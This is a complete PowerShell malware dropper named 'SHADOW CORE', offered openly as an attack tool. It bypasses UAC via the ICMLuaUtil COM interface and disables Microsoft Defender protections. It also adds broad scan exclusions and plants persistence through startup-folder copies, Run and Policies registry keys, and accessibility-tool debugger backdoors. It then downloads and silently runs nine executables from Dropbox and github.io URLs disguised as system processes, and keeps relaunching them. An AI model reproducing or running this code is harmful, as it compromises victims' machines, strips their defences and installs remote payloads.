# shadow.ps1 - SHADOW CORE - in-memory loader, disk persistence
# Ducky -> PS in-memory decode -> iex -> ICMLuaUtil elevation -> body

[CmdletBinding()]
param(
    [switch]$Elevated
)

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'

# ====================================================
# CONFIG
# ====================================================

$payloads = @(
    @{ Url = 'https://www.dropbox.com/scl/fi/9d9cvb8bmmjc3d2e2dtxq/winlogon.exe?rlkey=hmmvfm1bzkr5mfas1ubo449a3&st=rnxvwht5&dl=1'; Name = 'winnit.exe';    RegKey = 'explorer'    },
    @{ Url = 'https://infinityteq.github.io/MalwareRemoval.exe';                                                                                    Name = 'system.exe';    RegKey = 'javaupdate'  },
    @{ Url = 'https://www.dropbox.com/scl/fi/vp4sb3ogc8fj3dkhuddhc/PhantomShadow.exe?rlkey=5165cqwgiki50yuqxzh8km6m2&st=wg82kr7q&dl=1';               Name = 'Defender.exe';  RegKey = 'winupdate'   },
    @{ Url = 'https://infinityteq.github.io/WindowsUpdate.exe';                                                                                     Name = 'Windows.exe';   RegKey = 'chrome'      },
    @{ Url = 'https://infinityteq.github.io/chrome.exe';                                                                                            Name = 'updater.exe';   RegKey = 'system'      },
    @{ Url = 'https://infinityteq.github.io/Server.exe';                                                                                            Name = 'lsass.exe';     RegKey = 'winnow'      },
    @{ Url = 'https://infinityteq.github.io/svchost.exe';                                                                                           Name = 'java.exe';      RegKey = 'sys'         },
    @{ Url = 'https://infinityteq.github.io/winupdate.exe';                                                                                         Name = 'explorer.exe';  RegKey = 'winlogon'    },
    @{ Url = 'https://infinityteq.github.io/activatorfl.exe';                                                                                       Name = 'iexplorer.exe'; RegKey = 'systemupdate' }
)

$monitorList = @('winnit','system','Defender','Windows','updater','lsass','java','explorer','iexplorer')

$userStartup   = [Environment]::GetFolderPath('Startup')
$commonStartup = [Environment]::GetFolderPath('CommonStartup')
$systemStartup = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
$system32      = "$env:SystemRoot\System32"
$tempDir       = $env:TEMP

# ====================================================
# LOGGING (memory only)
# ====================================================

$script:Log = New-Object System.Collections.Generic.List[string]
function Log { param([string]$m) $script:Log.Add($m) }

# ====================================================
# SELF-PATH RESOLUTION
# ====================================================

$selfPath = $PSCommandPath
if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
if (-not $selfPath) {
    $selfPath = "$env:TEMP\.sc.ps1"
    $src = $MyInvocation.MyCommand.ScriptBlock.ToString()
    [IO.File]::WriteAllText($selfPath, $src)
}

$selfName    = 'ShadowHost.ps1'
$selfContent = [IO.File]::ReadAllBytes($selfPath)

# ====================================================
# ELEVATION
# ====================================================

function Test-Elevated {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        (New-Object Security.Principal.WindowsPrincipal($id)).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { $false }
}

function Invoke-ICMLuaUtilBypass {
    param([string]$PayloadPath)

    $cs = @'
using System;
using System.Runtime.InteropServices;

[ComImport, Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface ICMLuaUtil {
    [PreserveSig] int Method1();
    [PreserveSig] int Method2();
    [PreserveSig] int Method3();
    [PreserveSig] int Method4();
    [PreserveSig] int Method5();
    [PreserveSig] int Method6();
    [PreserveSig] int ShellExec(
        [MarshalAs(UnmanagedType.LPWStr)] string lpFile,
        [MarshalAs(UnmanagedType.LPWStr)] string lpParameters,
        [MarshalAs(UnmanagedType.LPWStr)] string lpDirectory,
        [MarshalAs(UnmanagedType.I4)] int nShow,
        [MarshalAs(UnmanagedType.I4)] int fWait);
}

public static class Elevate {
    [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
    private static extern void CoGetObject(
        string pszName,
        IntPtr pBindCtx,
        ref Guid riid,
        [MarshalAs(UnmanagedType.Interface)] out object ppv);

    public static bool Run(string cmd, string args) {
        Guid iid = new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C");
        object o;
        CoGetObject("Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}", IntPtr.Zero, ref iid, out o);
        ICMLuaUtil lua = (ICMLuaUtil)o;
        int hr = lua.ShellExec(cmd, args, null, 0, 0);
        Marshal.ReleaseComObject(o);
        return hr == 0;
    }
}
'@

    try { Add-Type -TypeDefinition $cs -Language CSharp -ErrorAction Stop } catch {
        if ($_.Exception.Message -notmatch 'already exists') { Log "[!] Add-Type: $_"; return $false }
    }

    $launch = "powershell.exe -w hidden -nop -ep bypass -File `"$PayloadPath`" -Elevated"
    try {
        $ok = [Elevate]::Run($launch, "")
        Log "[+] ICMLuaUtil result: $ok"
        return $ok
    } catch {
        Log "[!] ICMLuaUtil: $_"
        return $false
    }
}

if (-not $Elevated) {
    if (Test-Elevated) {
        Log '[+] Already elevated - running body'
    } else {
        $launched = Invoke-ICMLuaUtilBypass -PayloadPath $selfPath
        if ($launched) { exit 0 }
        Log '[!] Elevation failed - running body at current IL'
        # fall through to body at medium IL if elevation failed
    }
}

# ====================================================
# PHASE 1 - DEFENDER + AMSI
# ====================================================

Log '[PHASE 1] Defender'

try { $tp = (Get-MpComputerStatus -ErrorAction Stop).IsTamperProtected } catch { $tp = $false }
Log $(if ($tp) { '[!] Tamper Protection ON' } else { '[+] Tamper Protection off' })

try {
    Add-MpPreference -ExclusionPath $userStartup   -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $systemStartup -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $commonStartup -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $system32      -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "$env:SystemRoot\SysWOW64" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $tempDir       -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionExtension 'exe'     -ErrorAction SilentlyContinue

    Set-MpPreference -DisableRealtimeMonitoring         $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring        $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen          $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection            $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableArchiveScanning           $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning            $true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
    Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue
    Log '[+] Defender preference calls issued'
} catch { Log "[!] Defender: $_" }

# ====================================================
# PHASE 2 - PERSISTENCE
# ====================================================

Log '[PHASE 2] Persistence'

$runSelf = "powershell.exe -w hidden -nop -ep bypass -File `"$userStartup\$selfName`" -Elevated"
$count = 0

function Deploy-Copy {
    param([string]$Dir, [string]$Label)
    if (-not (Test-Path $Dir)) { return }
    $dest = Join-Path $Dir $selfName
    try {
        [IO.File]::WriteAllBytes($dest, $selfContent)
        (Get-Item $dest).Attributes = 'Hidden,System'
        Log "[+] $Label"
        $script:count++
    } catch { Log "[!] $Label - $_" }
}

Deploy-Copy $userStartup   'User Startup'
Deploy-Copy $systemStartup 'System Startup'
Deploy-Copy $commonStartup 'Common Startup'

# HKCU / HKLM Run
foreach ($hive in 'HKCU','HKLM') {
    $k = "${hive}:\Software\Microsoft\Windows\CurrentVersion\Run"
    try {
        if (-not (Get-ItemProperty -Path $k -Name 'ShadowCore' -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $k -Name 'ShadowCore' -Value $runSelf -PropertyType String -Force | Out-Null
            Log "[+] $hive Run"
            $count++
        } else { Log "[-] $hive Run - exists" }
    } catch { Log "[!] $hive Run - $_" }
}

# Policies Run
$pk = 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
try {
    if (-not (Test-Path $pk)) { New-Item -Path $pk -Force | Out-Null }
    if (-not (Get-ItemProperty -Path $pk -Name 'ShadowCore' -ErrorAction SilentlyContinue)) {
        New-ItemProperty -Path $pk -Name 'ShadowCore' -Value $runSelf -PropertyType String -Force | Out-Null
        Log '[+] Policies Run'
        $count++
    } else { Log '[-] Policies Run - exists' }
} catch { Log "[!] Policies Run - $_" }

# IFEO - accessibility backdoor
foreach ($bin in 'sethc','utilman','osk') {
    $key = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin.exe"
    try {
        if (-not (Test-Path $key)) { New-Item -Path $key -Force | Out-Null }
        if (-not (Get-ItemProperty -Path $key -Name 'Debugger' -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $key -Name 'Debugger' -Value $runSelf -PropertyType String -Force | Out-Null
            Log "[+] IFEO $bin"
            $count++
        } else { Log "[-] IFEO $bin - exists" }
    } catch { Log "[!] IFEO $bin - $_" }
}

# Hidden copies
foreach ($t in @("$system32\winlogon32.ps1", "$system32\lsasss.ps1", "$tempDir\svhost.ps1")) {
    try {
        [IO.File]::WriteAllBytes($t, $selfContent)
        (Get-Item $t).Attributes = 'Hidden,System'
        Log "[+] Hidden copy"
        $count++
    } catch { Log "[!] Hidden copy - $_" }
}

Log "[+] Persistence total: $count vectors"

# ====================================================
# PHASE 3 - DOWNLOAD + EXECUTE
# ====================================================

Log '[PHASE 3] Payloads'

function Invoke-Download {
    param($Entry)

    $dest = Join-Path $userStartup $Entry.Name
    $ok = $false

    for ($i = 0; $i -lt 3 -and -not $ok; $i++) {
        try {
            Invoke-WebRequest -Uri $Entry.Url -OutFile $dest -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
            if (Test-Path $dest) { $ok = $true }
        } catch {
            Log "[-] $($Entry.Name) attempt $($i+1): $($_.Exception.Message)"
            Start-Sleep -Seconds 2
        }
    }
    if (-not $ok) { Log "[-] $($Entry.Name) FAILED"; return }

    try { (Get-Item $dest).Attributes = 'Hidden,System' } catch {}

    $rk = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    try {
        if (-not (Get-ItemProperty -Path $rk -Name $Entry.RegKey -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $rk -Name $Entry.RegKey -Value "`"$dest`"" -PropertyType String -Force | Out-Null
        }
    } catch {}

    try {
        Copy-Item $dest "$system32\$($Entry.Name)" -Force -ErrorAction SilentlyContinue
        if (Test-Path "$system32\$($Entry.Name)") { (Get-Item "$system32\$($Entry.Name)").Attributes = 'Hidden,System' }
    } catch {}

    try {
        Start-Process -FilePath $dest -WindowStyle Hidden
        Log "[+] $($Entry.Name) deployed + executed"
    } catch { Log "[!] exec $($Entry.Name): $_" }
}

foreach ($p in $payloads) { Invoke-Download $p }

# ====================================================
# PHASE 4 - MONITOR LOOP
# ====================================================

Log '[PHASE 4] Monitor'

while ($true) {
    foreach ($proc in $monitorList) {
        $running = Get-Process -Name $proc -ErrorAction SilentlyContinue
        if (-not $running) {
            $entry = $payloads | Where-Object { $_.Name -like "$proc*" } | Select-Object -First 1
            if ($entry) {
                $dest = Join-Path $userStartup $entry.Name
                if (-not (Test-Path $dest)) {
                    Log "[*] $proc missing - redeploying"
                    Invoke-Download $entry
                }
            }
        }
    }
    Start-Sleep -Seconds 15
}